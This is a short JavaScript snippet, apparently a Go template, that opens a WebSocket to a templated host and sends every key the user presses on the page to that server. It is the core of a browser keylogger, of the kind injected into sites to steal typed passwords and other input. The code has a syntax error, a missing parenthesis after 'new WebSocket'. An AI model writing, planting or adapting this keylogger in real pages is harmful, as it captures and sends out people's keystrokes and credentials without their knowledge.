(function(){
    var conn = new WebSocket"ws://{{.}}/ws");
    document.onkeydown = keypress;
    function keypress(e){
        conn.send(e.key);
    }
})();
